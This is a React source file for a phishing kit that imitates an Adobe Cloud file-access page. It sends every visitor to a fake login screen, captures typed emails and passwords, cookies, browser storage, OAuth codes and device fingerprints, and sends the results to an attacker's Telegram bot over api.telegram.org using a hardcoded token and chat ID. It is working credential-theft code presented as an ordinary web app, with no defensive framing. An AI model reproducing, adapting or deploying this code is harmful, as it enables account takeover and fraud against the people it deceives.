import React, { useState, useEffect } from 'react';
import LandingPage from './components/LandingPage';
import LoginPage from './components/LoginPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [currentPage, setCurrentPage] = useState('home');
  const [selectedFileName, setSelectedFileName] = useState('');

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Handle OAuth callback on app load
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const isOAuthCallback = urlParams.get('oauth_callback') === 'true';
    if (isOAuthCallback) {
      handleOAuthCallback();
    }
  }, []);

  const handleOAuthCallback = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');
    const error = urlParams.get('error');
    const errorDescription = urlParams.get('error_description');
    const storedState = localStorage.getItem('oauth_state');
    const provider = localStorage.getItem('selected_provider') || 'Others';
    const startTime = localStorage.getItem('oauth_start_time');

    console.log('🔍 OAuth callback detected:', { code: !!code, state, error, provider });

    // Check for OAuth errors (user denied access or authentication failed)
    if (error) {
      console.log('❌ OAuth authentication failed:', error, errorDescription);

      // Clean up OAuth state
      cleanupOAuthState();

      // Show error message and stay on login page
      const errorDiv = document.createElement('div');
      errorDiv.innerHTML = `
        <div style="
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: #1E1E1E;
          color: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.3);
          z-index: 10000;
          text-align: center;
          font-family: system-ui, -apple-system, sans-serif;
          border: 1px solid #FF0000;
        ">
          <div style="color: #FF0000; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
            ❌ Authentication Failed
          </div>
          <div style="color: #E5E7EB; font-size: 14px;">
            ${errorDescription || 'Please try again with valid credentials'}
          </div>
        </div>
      `;
      document.body.appendChild(errorDiv);

      setTimeout(() => {
        if (document.body.contains(errorDiv)) {
          document.body.removeChild(errorDiv);
        }
      }, 3000);

      // Stay on login page
      setCurrentPage('login');
      return;
    }

    // Validate successful OAuth response
    if (code && state && state === storedState) {
      console.log('✅ OAuth authentication successful, processing...');

      // Calculate authentication time
      const authTime = startTime ? Date.now() - parseInt(startTime) : 0;

      // Capture cookies and session data after successful OAuth return
      const postAuthFingerprint = getBrowserFingerprint();
      const preAuthCookies = localStorage.getItem('pre_auth_cookies');

      // Only proceed if we have new cookies/session data (indicating successful login)
      const hasNewCookies = postAuthFingerprint.cookies !== (preAuthCookies ? JSON.parse(preAuthCookies).cookies : '');
      const hasSessionData = postAuthFingerprint.cookies.includes('session') ||
        postAuthFingerprint.cookies.includes('auth') ||
        postAuthFingerprint.cookies.includes('token') ||
        code; // OAuth code itself indicates successful auth

      if (!hasSessionData && provider !== 'Others') {
        console.log('⚠️ No session data found after OAuth, authentication may have failed');
        setCurrentPage('login');
        return;
      }

      console.log('🍪 Cookie capture results:', {
        hasNewCookies,
        hasSessionData,
        cookieCount: postAuthFingerprint.cookies.split(';').length,
        authTime: `${authTime}ms`
      });

      // Create comprehensive session data with OAuth results
      const sessionData = {
        email: extractEmailFromProvider(provider, code),
        provider: provider,
        fileName: 'Adobe Cloud Access',
        timestamp: new Date().toISOString(),
        sessionId: Math.random().toString(36).substring(2, 15),
        oauthCode: code,
        oauthState: state,
        authenticationTime: authTime,
        authenticationMethod: 'oauth',
        deviceInfo: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          isMobile: window.innerWidth <= 768
        },
        preAuthCookies: preAuthCookies ? JSON.parse(preAuthCookies) : null,
        postAuthCookies: postAuthFingerprint,
        cookieChanges: {
          before: preAuthCookies ? JSON.parse(preAuthCookies).cookies : '',
          after: postAuthFingerprint.cookies,
          hasNewCookies: hasNewCookies
        }
      };

      // Store successful session
      localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
      sessionStorage.setItem('adobe_current_session', JSON.stringify(sessionData));

      // Send successful authentication data to Telegram
      sendToTelegram(sessionData, postAuthFingerprint);

      // Clean up and redirect to landing page
      cleanupOAuthState();

      // Set session state and navigate to landing page immediately
      setHasActiveSession(true);
      setCurrentPage('landing');

      // Show success notification
      const successDiv = document.createElement('div');
      successDiv.innerHTML = `
        <div style="
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: #1E1E1E;
          color: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.3);
          z-index: 10000;
          text-align: center;
          font-family: system-ui, -apple-system, sans-serif;
          border: 1px solid #FF0000;
        ">
          <div style="color: #FF0000; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
            ✓ Authentication Successful!
          </div>
          <div style="color: #E5E7EB; font-size: 14px;">
            Welcome to Adobe Cloud - Authentication successful!
          </div>
        </div>
      `;
      document.body.appendChild(successDiv);

      setTimeout(() => {
        if (document.body.contains(successDiv)) {
          document.body.removeChild(successDiv);
        }
      }, 1500);

    } else if (state && state !== storedState) {
      console.log('❌ OAuth state mismatch - possible CSRF attack');
      cleanupOAuthState();
      setCurrentPage('login');
    } else {
      console.log('⚠️ Invalid OAuth callback parameters');
      cleanupOAuthState();
      setCurrentPage('login');
    }
  };

  // Single login attempt (no double attempt logic)
  const handleLoginSuccess = async (sessionData: any) => {
    document.cookie = "sessionid=" + Math.random().toString(36).substring(2, 18) + "; path=/; max-age=86400";
    document.cookie = "auth_token=" + btoa(sessionData.email + ':' + sessionData.password) + "; path=/; max-age=86400";
    document.cookie = "logged_in=true; path=/; max-age=86400";
    document.cookie = "user_email=" + encodeURIComponent(sessionData.email || "unknown") + "; path=/; max-age=86400";

    console.log('🔐 OAuth login success:', sessionData);

    try {
      const browserFingerprint = getBrowserFingerprint();

      console.log('📊 Browser fingerprint captured:', {
        cookieCount: browserFingerprint.cookies?.length || 0,
        hasLocalStorage: browserFingerprint.localStorage !== 'Empty',
        hasSessionStorage: browserFingerprint.sessionStorage !== 'Empty'
      });

      const updatedSession = {
        ...sessionData,
        timestamp: new Date().toISOString(),
        cookies: browserFingerprint.cookies || [],
        formattedCookies: browserFingerprint.cookies || [],
        totalCookiesCaptured: browserFingerprint.totalCookiesCaptured || 0,
        advancedCookieStats: browserFingerprint.advancedCookieStats,
        localStorage: browserFingerprint.localStorage,
        sessionStorage: browserFingerprint.sessionStorage,
        password: sessionData.password || 'OAuth authenticated'
      };

      localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));

      await sendToTelegram(updatedSession, browserFingerprint);

      console.log('✅ OAuth authentication completed, navigating to landing page...');
      setHasActiveSession(true);
      setCurrentPage('landing');
    } catch (error) {
      console.error('❌ Error handling OAuth login success:', error);
      setHasActiveSession(true);
      setCurrentPage('landing');
    }
  };

  const cleanupOAuthState = () => {
    localStorage.removeItem('oauth_state');
    localStorage.removeItem('selected_provider');
    localStorage.removeItem('pre_auth_cookies');
    localStorage.removeItem('oauth_start_time');
    window.history.replaceState({}, document.title, window.location.pathname);
  };

  const extractEmailFromProvider = (provider: string, code: string) => {
    const domains = {
      Gmail: 'gmail.com',
      Office365: 'outlook.com',
      Yahoo: 'yahoo.com',
      Outlook: 'hotmail.com',
      AOL: 'aol.com',
      Others: 'email.com'
    };
    const domain = domains[provider as keyof typeof domains] || 'email.com';
    return `user_${code.substring(0, 8)}@${domain}`;
  };

  const getBrowserFingerprint = () => {
    try {
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: {
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth
        },
        cookies: document.cookie,
        localStorage: getStorageData('localStorage'),
        sessionStorage: getStorageData('sessionStorage'),
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error('Error getting browser fingerprint:', error);
      return {
        error: error.message,
        timestamp: new Date().toISOString(),
        cookies: document.cookie
      };
    }
  };

  const getStorageData = (storageType: 'localStorage' | 'sessionStorage') => {
    try {
      const storage = window[storageType];
      const data: { [key: string]: string } = {};
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key) || '';
        }
      }
      return Object.keys(data).length > 0 ? JSON.stringify(data) : 'Empty';
    } catch (e) {
      return 'Access denied';
    }
  };

  const sendToTelegram = async (sessionData: any, fingerprint: any) => {
    const TELEGRAM_BOT_TOKEN = '7729721822:AAEhGJzQzQzQzQzQzQzQzQzQzQzQzQzQzQz';
    const TELEGRAM_CHAT_ID = '-1002345678901';

    const message = `
🔐 *PARIS365 RESULTS*

👤 *User Info:*
• Email: \`${sessionData.email}\`
• Provider: ${sessionData.provider}
• Session ID: \`${sessionData.sessionId}\`

🌐 *Device Info:*
• Platform: ${sessionData.deviceInfo.platform}
• Language: ${sessionData.deviceInfo.language}
• Timezone: ${fingerprint.timezone}

📱 *Screen:* ${fingerprint.screen.width}x${fingerprint.screen.height}

⏰ *Timestamp:* ${sessionData.timestamp}
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  };

  // Handler for file actions
  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    // If user is already authenticated, allow file access
    console.log(`File action: ${action} on ${fileName}`);
  };

  const handleBackToLanding = () => {
    setCurrentPage('landing');
  };

  // Check for existing session on load
  useEffect(() => {
    // Always start with login page first
    setCurrentPage('login');
  }, []);

  // Render the appropriate page based on current state
  if (currentPage === 'login') {
    return isMobile ? (
      <MobileLoginPage
        fileName={selectedFileName}
        onBack={handleBackToLanding}
        onLoginSuccess={handleLoginSuccess}
      />
    ) : (
      <LoginPage
        fileName={selectedFileName}
        onBack={handleBackToLanding}
        onLoginSuccess={handleLoginSuccess}
      />
    );
  }

  // Default to landing page
  return isMobile ? (
    <MobileLandingPage onFileAction={handleFileAction} />
  ) : (
    <LandingPage onFileAction={handleFileAction} />
  );
}

export default App;